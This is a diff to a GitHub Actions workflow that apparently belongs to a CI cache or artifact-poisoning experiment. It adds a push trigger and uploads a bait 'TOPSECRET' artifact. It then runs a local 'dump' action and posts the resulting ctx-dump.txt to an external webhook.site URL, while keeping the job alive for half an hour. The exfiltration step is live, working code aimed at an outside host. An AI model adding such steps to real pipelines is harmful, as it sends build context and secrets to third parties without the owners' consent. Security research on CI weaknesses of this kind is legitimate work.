@@ -1,5 +1,6 @@
 name: cb-a-live
 on:
+  push: {}
   workflow_dispatch: {}
 jobs:
   a:
@@ -7,10 +8,18 @@ jobs:
     timeout-minutes: 40
     steps:
       - uses: actions/checkout@v4
+      - name: make vault artifact
+        run: |
+          mkdir -p vault
+          echo "TOPSECRET-TRUSTED-ARTIFACT-$(date -u +%s)" > vault/vault.txt
+      - name: upload vault artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vault-TOPSECRET
+          path: vault/
       - name: dump
         uses: ./.github/actions/dump
-      - name: upload
+      - name: upload + hold
         run: |
-          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-dump.txt" -F "src=live-A"
-          echo "holding job alive for cache experiments"
-          sleep 1800
+          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@ctx-dump.txt" -F "src=live-A2"
+          echo holding; sleep 1800
